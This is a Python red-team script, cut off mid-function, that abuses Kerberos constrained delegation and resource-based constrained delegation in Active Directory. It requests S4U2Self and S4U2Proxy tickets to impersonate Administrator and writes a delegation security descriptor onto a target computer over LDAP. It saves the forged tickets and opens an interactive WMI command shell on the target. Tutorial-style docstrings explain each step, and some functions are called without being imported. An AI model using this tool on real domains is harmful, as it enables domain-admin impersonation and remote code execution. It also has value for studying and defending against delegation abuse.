#!/usr/bin/env python3


import sys
import os
import re
import glob
import subprocess
import shutil
import types
import getpass

# ── impacket imports ──────────────────────────────────────────────────────────
try:
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.ldap import ldaptypes
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("    Run: pip3 install impacket")
    sys.exit(1)


# ── colors ────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
M  = "\033[95m"
C  = "\033[96m"
W  = "\033[97m"
BO = "\033[1m"
RS = "\033[0m"

BANNER = f"""
{M}{BO}╔══════════════════════════════════════════════╗
║         S 4 U 2 S E L F  +  S 4 U 2 P R O X Y       ║
║         Constrained Delegation & RBCD Abuse         ║
╚═════════════════════════════════════════════════════╝{RS}
"""

# ─────────────────────────────────────────────────────────────────────────────
# STEP 1 — Get TGT for the service account we compromised
# ─────────────────────────────────────────────────────────────────────────────
def get_tgt(username, domain, dc_ip, password="", nt_hash=""):
    """
    Authenticate to the KDC and get a TGT for our service account.

    WHY: S4U extensions require the requesting service to hold a valid TGT.
         The KDC will only honor S4U requests from authenticated services.

    WHAT HAPPENS INSIDE:
      1. We send an AS-REQ with our credentials (PA-ENC-TIMESTAMP pre-auth)
      2. KDC verifies our password/hash
      3. KDC returns AS-REP containing our TGT encrypted with krbtgt's key
      4. We decrypt the session key using our password/hash
    """
    print(f"\n{B}{'─'*55}")
    print(f"  STEP 1 — Get TGT for service account: {username}")
    print(f"{'─'*55}{RS}")
    print(f"  {C}Sending AS-REQ to KDC {dc_ip}...{RS}")
    print(f"  {C}  → Pre-auth: {'NT Hash (RC4)' if nt_hash else 'Password'}{RS}")

    user_principal = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    try:
        if nt_hash:
            # Normalise hash: strip colons/spaces, validate length
            nt_clean = nt_hash.replace(":", "").replace(" ", "").lower()
            if len(nt_clean) != 32:
                print(f"  {R}[!] NT hash must be 32 hex chars (got {len(nt_clean)}){RS}")
                sys.exit(1)
            lm = "aad3b435b51404eeaad3b435b51404ee"
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password="",
                domain=domain,
                lmhash=bytes.fromhex(lm),
                nthash=bytes.fromhex(nt_clean),
                aesKey="",
                kdcHost=dc_ip
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password=password,
                domain=domain,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip
            )

        print(f"  {G}[+] TGT received!{RS}")
        print(f"  {G}    KDC confirmed identity of {username}@{domain.upper()}{RS}")
        print(f"  {Y}    TGT is our 'service identity token' for S4U requests{RS}")
        return tgt, cipher, old_sk, sk

    except Exception as e:
        print(f"  {R}[!] TGT failed: {e}{RS}")
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — S4U2Self: get a ticket to ourselves impersonating the target user
# ─────────────────────────────────────────────────────────────────────────────
def s4u2self(username, domain, dc_ip, impersonate_user, tgt, cipher, old_sk, sk):
    """
    S4U2Self: request a service ticket for 'impersonate_user' → 'username' (us).

    WHY THIS WORKS:
      The KDC allows a service to request tickets for arbitrary users
      TO ITSELF. This simulates a user who authenticated via a non-Kerberos
      protocol (NTLM, forms, certificates) but the backend needs a Kerberos
      ticket for that user.

    WHAT HAPPENS INSIDE THE TGS-REQ:
      1. We include our TGT in the request (proves who WE are)
      2. We include a PA-FOR-USER structure containing:
           - Username we want to impersonate
           - Our realm
           - A checksum signed with our session key
      3. KDC verifies our TGT, then generates a service ticket:
           Client = impersonate_user  (the victim)
           Server = username          (us, the service)
      4. This ticket says "impersonate_user authenticated to username's service"

    KEY FLAG — forwardable:
      If our account has "TrustedToAuthForDelegation" (T2A4D) set,
      the returned ticket will be FORWARDABLE — required for S4U2Proxy.
      Without T2A4D, the ticket is non-forwardable and S4U2Proxy will fail
      UNLESS we're doing RBCD (which doesn't require it).

    RESULT:
      We get a service ticket that says Administrator logged into our service.
      We haven't touched Administrator's password at all.
    """
    print(f"\n{B}{'─'*55}")
    print(f"  STEP 2 — S4U2Self")
    print(f"{'─'*55}{RS}")
    print(f"  {C}Impersonating:  {impersonate_user}{RS}")
    print(f"  {C}Service (us):   {username}@{domain.upper()}{RS}")
    print(f"  {C}Sending TGS-REQ with PA-FOR-USER extension...{RS}")
    print(f"  {Y}")
    print(f"    What we're asking the KDC:")
    print(f"    'I am {username}. Give me a service ticket")
    print(f"     where the CLIENT is {impersonate_user}.'")
    print(f"  {RS}")

    # The user we want to impersonate
    impersonate_principal = Principal(
        impersonate_user,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    # Our own service principal
    server_principal = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    try:
        # impacket's getKerberosTGS handles S4U2Self when we pass
        # serverName = our own account and pass impersonateUser
        tgs, cipher2, old_sk2, sk2 = getKerberosTGS(
            serverName=server_principal,
            domain=domain,
            kdcHost=dc_ip,
            tgt=tgt,
            cipher=cipher,
            sessionKey=sk,
            impersonateUser=impersonate_principal   # ← THIS triggers S4U2Self
        )

        print(f"  {G}[+] S4U2Self SUCCESS!{RS}")
        print(f"  {G}    Got ticket: {impersonate_user} → {username}{RS}")
        print(f"  {Y}    This ticket proves '{impersonate_user} authenticated to us'")
        print(f"    Next we use it to pivot to the actual target service.{RS}")
        return tgs, cipher2, old_sk2, sk2

    except Exception as e:
        print(f"  {R}[!] S4U2Self failed: {e}{RS}")
        print(f"  {Y}  Hint: Account may not have TrustedToAuthForDelegation set.{RS}")
        print(f"  {Y}  For RBCD mode this is OK — forwardable not required.{RS}")
        return None, None, None, None


# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — S4U2Proxy: proxy the ticket to the actual target service
# ─────────────────────────────────────────────────────────────────────────────
def s4u2proxy(username, domain, dc_ip, target_spn, impersonate_user,
              s4u2self_tgs, tgt, cipher, old_sk, sk):
    """
    S4U2Proxy: take our S4U2Self ticket and ask the KDC to issue a NEW
    service ticket for impersonate_user → TARGET SERVICE.

    WHY THIS WORKS:
      Now that we have a ticket saying "{impersonate_user} → us",
      we present it to the KDC along with our TGT and say:
        "Use this ticket as evidence that impersonate_user delegated to us.
         Issue a ticket for impersonate_user → target_spn"

    WHAT HAPPENS INSIDE THE TGS-REQ:
      1. We send our own TGT (authenticates us as the service)
      2. We include the S4U2Self ticket in the 'additional-tickets' field
      3. We set cname-in-addl-tkt flag — tells KDC to use the client name
         from the additional ticket (= impersonate_user)
      4. KDC checks:
           - Is our account allowed to delegate to target_spn?
             (msDS-AllowedToDelegateTo  OR  msDS-AllowedToActOnBehalfOf)
           - Is the additional ticket forwardable? (required for classic CD,
             not for RBCD)
      5. If checks pass, KDC issues:
           Client = impersonate_user
           Server = target_spn
           → This is a fully valid service ticket!

    DIFFERENCE: Constrained Delegation vs RBCD
      Classic CD:  delegation allowed is set on OUR account
                   (msDS-AllowedToDelegateTo on svc_account)
      RBCD:        delegation allowed is set on the TARGET machine
                   (msDS-AllowedToActOnBehalfOfOtherIdentity on the DC/server)
                   KDC checks the target's attribute, not ours.

    RESULT:
      We hold a Kerberos service ticket for:
        impersonate_user@LAB.LOCAL → cifs/WIN-RM9TRCNVS9P.lab.local
      We can present this ticket directly to the target machine for SMB/WMI.
    """
    print(f"\n{B}{'─'*55}")
    print(f"  STEP 3 — S4U2Proxy")
    print(f"{'─'*55}{RS}")
    print(f"  {C}Target SPN:     {target_spn}{RS}")
    print(f"  {C}Impersonating:  {impersonate_user}{RS}")
    print(f"  {Y}")
    print(f"    What we're asking the KDC:")
    print(f"    'I have proof that {impersonate_user} delegated to me.")
    print(f"     Now give me a ticket for {impersonate_user} → {target_spn}'")
    print(f"  {RS}")

    target_principal = Principal(
        target_spn,
        type=constants.PrincipalNameType.NT_SRV_INST.value
    )

    try:
        # S4U2Proxy: pass the S4U2Self TGS as the 'additional-tickets'
        tgs, cipher2, old_sk2, sk2 = getKerberosTGS(
            serverName=target_principal,
            domain=domain,
            kdcHost=dc_ip,
            tgt=tgt,
            cipher=cipher,
            sessionKey=sk,
            additionalTicket=s4u2self_tgs   # ← THIS triggers S4U2Proxy
        )

        print(f"  {G}[+] S4U2Proxy SUCCESS!{RS}")
        print(f"  {G}    Got ticket: {impersonate_user} → {target_spn}{RS}")
        print(f"  {G}    We now hold a valid Kerberos ticket as Administrator!{RS}")
        return tgs, cipher2, old_sk2, sk2

    except Exception as e:
        print(f"  {R}[!] S4U2Proxy failed: {e}{RS}")
        print(f"  {Y}  Common reasons:{RS}")
        print(f"  {Y}    - Account not trusted for delegation to this SPN{RS}")
        print(f"  {Y}    - S4U2Self ticket was not forwardable (classic CD){RS}")
        print(f"  {Y}    - RBCD attribute not set on target computer{RS}")
        return None, None, None, None


# ─────────────────────────────────────────────────────────────────────────────
# STEP 4 — Save ticket as .ccache and use with SMB
# ─────────────────────────────────────────────────────────────────────────────
def save_ticket(tgs, username, domain, target_spn, impersonate_user):
    """
    Save the forged S4U ticket to a .ccache file.

    WHY: impacket tools (smbclient.py, wmiexec.py, psexec.py) and
         native Linux Kerberos tools (klist, kinit) read tickets from
         .ccache files. We export KRB5CCNAME to point to our file.

    FORMAT: MIT Kerberos credential cache — standard cross-platform format.
    """
    print(f"\n{B}{'─'*55}")
    print(f"  STEP 4 — Save ticket to .ccache")
    print(f"{'─'*55}{RS}")

    ccache     = CCache()
    ccache.fromTGS(tgs, f"{impersonate_user}@{domain.upper()}", target_spn)

    filename   = f"s4u_{impersonate_user}_{target_spn.replace('/', '_')}.ccache"
    ccache.saveFile(filename)

    # Guard: SPN must contain '/' (e.g. cifs/host.domain)
    spn_parts = target_spn.split('/')
    target_host = spn_parts[1] if len(spn_parts) >= 2 else target_spn

    print(f"  {G}[+] Ticket saved → {filename}{RS}")
    print(f"\n  {C}Use the ticket:{RS}")
    print(f"  {W}export KRB5CCNAME={filename}{RS}")
    print(f"  {W}python3 smbclient.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
    print(f"  {W}python3 wmiexec.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
    print(f"  {W}python3 psexec.py -k -no-pass {domain}/{impersonate_user}@{target_host}{RS}")
    return filename


# ─────────────────────────────────────────────────────────────────────────────
# LDAP — enumerate delegation accounts (useful for recon)
# ─────────────────────────────────────────────────────────────────────────────
def ldap_enum_delegation(dc_ip, domain, username, password, nt_hash=""):
    """
    Find accounts/computers with delegation configured:

    1. Unconstrained Delegation
       userAccountControl & TRUSTED_FOR_DELEGATION (0x80000)
       → Service gets users' full TGT when they connect. Most dangerous.

    2. Constrained Delegation (classic)
       msDS-AllowedToDelegateTo is set
       → Service can only delegate to specific SPNs listed here.

    3. Resource-Based Constrained Delegation
       msDS-AllowedToActOnBehalfOfOtherIdentity is set on COMPUTER objects
       → The TARGET machine decides who can delegate to it.

    4. TrustedToAuthForDelegation (T2A4D)
       userAccountControl & TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)
       → Required for S4U2Self to produce a forwardable ticket (classic CD).
    """
    base_dn = "DC=" + domain.replace(".", ",DC=")
    print(f"\n{B}[*] Connecting to LDAP {dc_ip} for delegation recon...{RS}")

    try:
        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
        if nt_hash:
            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
        else:
            conn.login(username, password, domain)
        print(f"  {G}[+] Authenticated as {username}@{domain}{RS}")
    except Exception as e:
        print(f"  {R}[!] LDAP failed: {e}{RS}")
        sys.exit(1)

    results = {
        "unconstrained": [],
        "constrained":   [],
        "rbcd":          [],
    }

    # ── 1. Unconstrained Delegation ──
    print(f"\n  {C}[1] Searching unconstrained delegation (flag 0x80000)...{RS}")
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(|(objectClass=user)(objectClass=computer))"
                "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                ")"
            ),
            attributes=["sAMAccountName", "objectClass", "userAccountControl"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam = ""
            for attr in item['attributes']:
                if str(attr['type']) == "sAMAccountName":
                    sam = str(attr['vals'][0])
            if sam:
                results["unconstrained"].append(sam)
    except Exception as e:
        print(f"  {R}  Error: {e}{RS}")

    # ── 2. Constrained Delegation ──
    print(f"  {C}[2] Searching constrained delegation (msDS-AllowedToDelegateTo)...{RS}")
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(|(objectClass=user)(objectClass=computer))"
                "(msDS-AllowedToDelegateTo=*)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                ")"
            ),
            attributes=["sAMAccountName", "msDS-AllowedToDelegateTo",
                        "userAccountControl"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam, spns, uac = "", [], 0
            for attr in item['attributes']:
                name = str(attr['type'])
                vals = [str(v) for v in attr['vals']]
                if name == "sAMAccountName":
                    sam = vals[0]
                elif name == "msDS-AllowedToDelegateTo":
                    spns = vals
                elif name == "userAccountControl":
                    uac = int(vals[0])
            if sam and spns:
                # T2A4D flag = 0x1000000 = 16777216
                t2a4d = bool(uac & 16777216)
                results["constrained"].append({
                    "account": sam,
                    "spns":    spns,
                    "t2a4d":   t2a4d
                })
    except Exception as e:
        print(f"  {R}  Error: {e}{RS}")

    # ── 3. RBCD ──
    print(f"  {C}[3] Searching RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)...{RS}")
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(objectClass=computer)"
                "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
                ")"
            ),
            attributes=["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam = ""
            for attr in item['attributes']:
                if str(attr['type']) == "sAMAccountName":
                    sam = str(attr['vals'][0])
            if sam:
                results["rbcd"].append(sam)
    except Exception as e:
        print(f"  {R}  Error: {e}{RS}")

    conn.close()

    # ── Print results ──
    print(f"\n{G}{BO}════ DELEGATION ENUMERATION RESULTS ════{RS}\n")

    print(f"{Y}{BO}[1] UNCONSTRAINED DELEGATION{RS} "
          f"(most dangerous — gets full TGT of any connecting user)")
    if results["unconstrained"]:
        for acc in results["unconstrained"]:
            print(f"  {R}  ⚠  {acc}{RS}")
    else:
        print(f"  {G}  None found{RS}")

    print(f"\n{Y}{BO}[2] CONSTRAINED DELEGATION{RS} "
          f"(can delegate to specific SPNs only)")
    if results["constrained"]:
        for entry in results["constrained"]:
            t2a4d_flag = f"{G}T2A4D=YES{RS}" if entry['t2a4d'] else f"{R}T2A4D=NO{RS}"
            print(f"  {C}  {entry['account']:<30}{RS} [{t2a4d_flag}]")
            for spn in entry['spns']:
                print(f"      {B}↳ {spn}{RS}")
    else:
        print(f"  {G}  None found{RS}")

    print(f"\n{Y}{BO}[3] RESOURCE-BASED CONSTRAINED DELEGATION{RS} "
          f"(RBCD — set on target machine)")
    if results["rbcd"]:
        for acc in results["rbcd"]:
            print(f"  {C}  {acc}{RS}")
    else:
        print(f"  {G}  None found{RS}")

    return results


# ─────────────────────────────────────────────────────────────────────────────
# RBCD SETUP — write msDS-AllowedToActOnBehalfOfOtherIdentity
# ─────────────────────────────────────────────────────────────────────────────
def rbcd_setup(dc_ip, domain, username, password, target_computer,
               attacker_account_sid, nt_hash=""):
    """
    Write our attacker-controlled account's SID into the target computer's
    msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

    WHY: This tells the KDC:
      "Computer TARGET trusts ATTACKER_ACCOUNT to delegate to it."
      Once set, we can S4U2Self + S4U2Proxy as any user to TARGET.

    WHAT WE'RE WRITING:
      A Security Descriptor (SECURITY_DESCRIPTOR) in binary format
      containing a DACL with an ACE that allows our SID to delegate.

      Structure:
        SECURITY_DESCRIPTOR
          └── DACL
                └── ACE (ACCESS_ALLOWED, SID=attacker_account_sid)

    PREREQUISITE:
      You must have WRITE access to the target computer object.
      This comes from:
        - GenericWrite / GenericAll on the computer
        - WriteDacl
        - Owning the object
      Often found via BloodHound → bad ACL paths.

    ATTACKER_ACCOUNT_SID:
      The SID of the machine/user account you control.
      Get it from: python3 s4u.py --get-sid -u <account> ...
    """
    print(f"\n{B}{'─'*55}")
    print(f"  RBCD SETUP — Writing delegation attribute")
    print(f"{'─'*55}{RS}")
    print(f"  {C}Target computer:      {target_computer}{RS}")
    print(f"  {C}Attacker account SID: {attacker_account_sid}{RS}")
    print(f"  {Y}")
    print(f"    We're writing a Security Descriptor to:")
    print(f"    {target_computer}$  →  msDS-AllowedToActOnBehalfOfOtherIdentity")
    print(f"    This grants our account the right to use S4U2Proxy")
    print(f"    against {target_computer} as ANY user.")
    print(f"  {RS}")

    base_dn = "DC=" + domain.replace(".", ",DC=")
    try:
        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
        if nt_hash:
            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
        else:
            conn.login(username, password, domain)
        print(f"  {G}[+] LDAP authenticated{RS}")
    except Exception as e:
        print(f"  {R}[!] LDAP failed: {e}{RS}")
        return False

    # Build the Security Descriptor binary blob
    # Format: SECURITY_DESCRIPTOR with one DACL ACE allowing our SID
    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1']     = b'\x00'
        # SE_DACL_PRESENT=0x0004 | SE_SELF_RELATIVE=0x8000 → little-endian bytes
        sd['Control']  = b'\x04\x80'
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['GroupSid'] = ldaptypes.LDAP_SID()

        # Build DACL with one plain ACCESS_ALLOWED_ACE (not object ACE)
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 2   # ACL_REVISION for non-object ACEs
        acl['Sbz1']        = 0
        acl['Sbz2']        = 0

        ace = ldaptypes.ACCESS_ALLOWED_ACE()
        ace['Mask'] = ldaptypes.ACCESS_MASK()
        ace['Mask']['Mask'] = 0xf01ff    # GENERIC_ALL
        ace['Flags'] = 0

        # Parse the SID string
        ace_sid = ldaptypes.LDAP_SID()
        ace_sid.fromCanonical(attacker_account_sid)
        ace['Sid'] = ace_sid

        acl['Data'] = ace.getData()
        sd['Dacl']  = acl

        # Find the target computer's DN
        resp = conn.search(
            searchFilter=f"(sAMAccountName={target_computer}$)",
            attributes=["distinguishedName"]
        )
        target_dn = None
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            for attr in item['attributes']:
                if str(attr['type']) == "distinguishedName":
                    target_dn = str(attr['vals'][0])

        if not target_dn:
            print(f"  {R}[!] Computer {target_computer} not found in LDAP{RS}")
            return False

        print(f"  {B}  Target DN: {target_dn}{RS}")

        # Write the attribute using impacket's modifyObject
        conn.modifyObject(
            target_dn,
            {
                'msDS-AllowedToActOnBehalfOfOtherIdentity': (
                    ldap.MODIFY_REPLACE, [sd.getData()]
                )
            }
        )
        print(f"  {G}[+] RBCD attribute written successfully!{RS}")
        print(f"  {G}    {target_computer} now trusts our account for delegation.{RS}")
        conn.close()
        return True

    except Exception as e:
        print(f"  {R}[!] Failed to write attribute: {e}{RS}")
        print(f"  {Y}  Check that you have GenericWrite/WriteDacl on {target_computer}${RS}")
        conn.close()
        return False


# ─────────────────────────────────────────────────────────────────────────────
# WMI SHELL — uses opth_final.py loaded dynamically via importlib
# ─────────────────────────────────────────────────────────────────────────────
def _launch_wmi_shell_with_ccache(args, ccache_path):
    """
    Interactive WMI shell using the S4U ccache ticket.
    Fully self-contained — no dependency on any external script.

    HOW:
      1. Set KRB5CCNAME so impacket uses our ticket automatically
      2. Create SMBConnection with useCache=True (reads KRB5CCNAME)
      3. Connect via DCOM/WMI with doKerberos=True + empty hash
      4. Run commands via Win32_Process, read output back over SMB C$
    """
    try:
        from impacket.dcerpc.v5.dcom import wmi as wmi_mod
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dtypes import NULL
    except ImportError:
        print(f"  {R}[!] impacket DCOM modules not found.{RS}")
        print(f"  {Y}  Run: pip install impacket{RS}")
        return

    import time

    # ─ Set KRB5CCNAME ────────────────────────────────────────────────
    abs_ccache = os.path.abspath(ccache_path)
    os.environ["KRB5CCNAME"] = abs_ccache
    print(f"\n  {G}[+] KRB5CCNAME → {abs_ccache}{RS}")

    spn_parts   = args.target_spn.split('/')
    target_host = spn_parts[1] if len(spn_parts) >= 2 else args.dc
    out_file    = f"__s4u_{os.getpid()}"
    out_unc     = f"\\\\127.0.0.1\\C$\\{out_file}"

    # ─ SMB connection (reads ccache via KRB5CCNAME) ──────────────────
    try:
        print(f"  {C}Connecting SMB → {target_host}...{RS}")
        smb = SMBConnection(target_host, args.dc, sess_port=445, timeout=30)
        smb.kerberosLogin(
            user=args.impersonate, password="", domain=args.domain,
            lmhash="", nthash="", aesKey="",
            kdcHost=args.dc, useCache=True
        )
        print(f"  {G}[+] SMB OK — authenticated as {args.impersonate}@{args.domain}{RS}")
    except Exception as e:
        print(f"  {R}[!] SMB failed: {e}{RS}")
        return

    # ─ DCOM / WMI connection ─────────────────────────────────────────
    try:
        print(f"  {C}Connecting WMI → {target_host}...{RS}")
        dcom = DCOMConnection(
            target_host,
            username=args.impersonate, password="",
            domain=args.domain,
            lmhash="aad3b435b51404eeaad3b435b51404ee",
            nthash="",
            aesKey="",
            oxidResolver=True,
            doKerberos=True,
            kdcHost=args.dc
        )
        iface         = dcom.CoCreateInstanceEx(wmi_mod.CLSID_WbemLevel1Login,
                                                wmi_mod.IID_IWbemLevel1Login)
        iWbemLogin    = wmi_mod.IWbemLevel1Login(iface)
        iWbemServices = iWbemLogin.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLogin.RemRelease()
        win32Process, _ = iWbemServices.GetObject("Win32_Process")
    except Exception as e:
        print(f"  {R}[!] WMI connection failed: {e}{RS}")
        try: dcom.disconnect()
        except Exception: pass
        try: smb.logoff()
        except Exception: pass
        return

    print(f"\n  {G}{BO}[+] WMI Shell ready!{RS}")
    print(f"  {G}    Connected: {args.domain}\\{args.impersonate}@{target_host}{RS}")
    print(f"  {Y}    Type 'exit' to quit. Ctrl+C cancels current command.{RS}\n")

    import signal
    import io

    cwd          = "C:\\"
    _running     = [True]   # mutable so the signal handler can write it

    # ── Install a clean Ctrl+C handler ───────────────────────────────
    # Without this, KeyboardInterrupt propagates into impacket's C-extension
    # threads and produces multi-line tracebacks.
    def _sigint(sig, frame):
        _running[0] = False
        print(f"\n  {Y}[*] Ctrl+C — exiting shell...{RS}", flush=True)

    old_handler = signal.signal(signal.SIGINT, _sigint)

    def _cleanup():
        """Disconnect silently — suppress impacket's error messages."""
        signal.signal(signal.SIGINT, old_handler)   # restore original handler
        _devnull = open(os.devnull, "w")
        _old_err, sys.stderr = sys.stderr, _devnull
        try:
            dcom.disconnect()
        except Exception:
            pass
        try:
            smb.logoff()
        except Exception:
            pass
        sys.stderr = _old_err
        _devnull.close()
        print(f"  {G}[+] WMI session closed.{RS}\n")

    # ── Shell loop ───────────────────────────────────────────────────
    while _running[0]:
        try:
            cmd_in = input(
                f"  {Y}[WMI] {args.domain}\\{args.impersonate}:{cwd}> {RS}"
            ).strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            # Ctrl+C at the prompt — caught here before signal handler fires
            _running[0] = False
            print(f"\n  {Y}[*] Ctrl+C — exiting shell...{RS}")
            break

        if not cmd_in:
            continue
        if cmd_in.lower() in ("exit", "quit", "q"):
            print(f"  {Y}[*] Closing shell...{RS}")
            break

        full_cmd = (
            f"cmd.exe /Q /v:on /c "
            f"(cd /d \"{cwd}\" && {cmd_in} & echo __CWD_S__!CD!__CWD_E__) "
            f"1> {out_unc} 2>&1"
        )

        try:
            win32Process.Create(full_cmd, "C:\\", None)
        except Exception as e:
            print(f"  {R}[!] Execution error: {e}{RS}")
            continue

        # Wait for output — Ctrl+C here just skips the read, shell stays open
        try:
            import time as _time
            _time.sleep(1.5)
        except KeyboardInterrupt:
            print(f"  {Y}[*] Command interrupted (output may be incomplete){RS}")
            continue

        try:
            buf = []
            smb.getFile("C$", out_file, lambda d: buf.append(d))
            raw = b"".join(buf).decode("utf-8", errors="replace")

            cwd_match = re.search(r"__CWD_S__(.+?)__CWD_E__", raw)
            if cwd_match:
                cwd = cwd_match.group(1).strip()
                out = re.sub(r"__CWD_S__.+?__CWD_E__", "", raw).strip()
            else:
                out = raw.strip()

            print(f"\n{out}\n" if out else "")

            try:
                smb.deleteFile("C$", out_file)
            except Exception:
                pass

        except KeyboardInterrupt:
            print(f"  {Y}[*] Read interrupted{RS}")
            continue
        except Exception as e:
            print(f"  {R}[!] Output read error: {e}{RS}")

    _cleanup()




def _find_getST():
    """
    Locate the impacket getST binary on the system.
    Checks PATH first, then common install locations on Kali/Debian.
    """
    for candidate in ["impacket-getST", "getST.py"]:
        found = shutil.which(candidate)
        if found:
            return found
    for path in [
        "/usr/bin/impacket-getST",
        "/usr/local/bin/impacket-getST",
        "/usr/share/doc/python3-impacket/examples/getST.py",
        "/usr/share/impacket/getST.py",
    ]:
        if os.path.exists(path):
            return path
    return None


def s4u_via_getST(args, password, nt_hash):
    """
    Perform S4U2Self + S4U2Proxy using impacket-getST.

    WHY: Older impacket versions don't expose impersonateUser / additionalTicket
         as kwargs in getKerberosTGS(). impacket-getST is the reference tool
         that handles S4U correctly in every impacket release.

    WHAT IT DOES:
      1. Calls impacket-getST with -spn and -impersonate flags
      2. getST internally does TGT → S4U2Self → S4U2Proxy
      3. It saves the ticket as <user>.ccache in the current directory
      4. We rename it to our standard filename and print usage commands
    """
    getST = _find_getST()
    if getST is None:
        print(f"\n  {R}[!] impacket-getST not found on this system.{RS}")
        print(f"  {Y}  Fix: pip install git+https://github.com/fortra/impacket.git --break-system-packages{RS}")
        sys.exit(1)

    print(f"\n{B}{'─'*55}")
    print(f"  S4U ATTACK — via impacket-getST")
    print(f"{'─'*55}{RS}")
    print(f"  {C}Service account: {args.username}{RS}")
    print(f"  {C}Impersonating:   {args.impersonate}{RS}")
    print(f"  {C}Target SPN:      {args.target_spn}{RS}")
    print(f"  {C}Using tool:      {getST}{RS}")

    # Build command
    cmd = [getST, "-spn", args.target_spn,
           "-impersonate", args.impersonate,
           "-dc-ip", args.dc]

    if nt_hash:
        cmd += ["-hashes", f":{nt_hash}", f"{args.domain}/{args.username}"]
    else:
        cmd += [f"{args.domain}/{args.username}:{password}"]

    print(f"\n  {Y}Running getST... {RS}")

    result = subprocess.run(cmd, capture_output=True, text=True)
    output  = result.stdout + result.stderr

    # getST ccache naming changed across versions:
    #   impacket ≤0.10 : Administrator.ccache
    #   impacket ≥0.11 : Administrator@cifs_host@REALM.ccache
    # Use glob to find whichever format was written.
    ccache_dst = f"s4u_{args.impersonate}_{args.target_spn.replace('/', '_')}.ccache"

    candidates = (
        glob.glob(f"{args.impersonate}.ccache") +
        glob.glob(f"{args.impersonate}@*.ccache")
    )
    ccache_src = max(candidates, key=os.path.getmtime) if candidates else None

    if ccache_src:
        os.rename(ccache_src, ccache_dst)

        spn_parts   = args.target_spn.split('/')
        target_host = spn_parts[1] if len(spn_parts) >= 2 else args.target_spn

        print(f"  {G}[+] S4U2Self + S4U2Proxy SUCCESS!{RS}")
        print(f"  {G}    Ticket: {args.impersonate} → {args.target_spn}{RS}")
        print(f"  {G}    Saved → {ccache_dst}{RS}")
        print(f"\n  {C}Use the ticket:{RS}")
        print(f"  {W}export KRB5CCNAME={ccache_dst}{RS}")
        print(f"  {W}impacket-wmiexec   -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")
        print(f"  {W}impacket-smbclient -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")
        print(f"  {W}impacket-psexec    -k -no-pass {args.domain}/{args.impersonate}@{target_host}{RS}")

        # Offer to open WMI shell immediately using opth_final.py
        try:
            shell_ans = input(
                f"\n  {C}Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: {RS}"
            ).strip().lower()
        except EOFError:
            shell_ans = "n"

        if shell_ans in ("y", "yes"):
            _launch_wmi_shell_with_ccache(args, ccache_dst)
    else:
        print(f"  {R}[!] S4U failed — no ccache file found. getST output:{RS}")
        print(output)
        sys.exit(1)


def flow_constrained(args, password, nt_hash):
    """
    CONSTRAINED DELEGATION ATTACK FLOW
    ════════════════════════════════════
    Prerequisite:
      You have credentials for a service account that has
      msDS-AllowedToDelegateTo set pointing to the target SPN.
    """
    print(f"\n{M}{BO}[ CONSTRAINED DELEGATION FLOW ]{RS}")
    print(f"  Service account:  {args.username}")
    print(f"  Impersonating:    {args.impersonate}")
    print(f"  Target SPN:       {args.target_spn}")
    s4u_via_getST(args, password, nt_hash)


def flow_rbcd(args, password, nt_hash):
    """
    RBCD ATTACK FLOW
    ════════════════
    Prerequisite:
      You have WRITE access to target computer object (via bad ACL),
      AND you control a machine account or have addcomputer rights.
    """
    print(f"\n{M}{BO}[ RBCD FLOW ]{RS}")
    print(f"  Our account:      {args.username}")
    print(f"  Impersonating:    {args.impersonate}")
    print(f"  Target computer:  {args.target_computer}")
    print(f"  Target SPN:       {args.target_spn}")

    if args.setup_rbcd:
        if not args.attacker_sid:
            print(f"{R}[!] Attacker SID required for RBCD setup{RS}")
            sys.exit(1)
        ok = rbcd_setup(
            args.dc, args.domain, args.username, password,
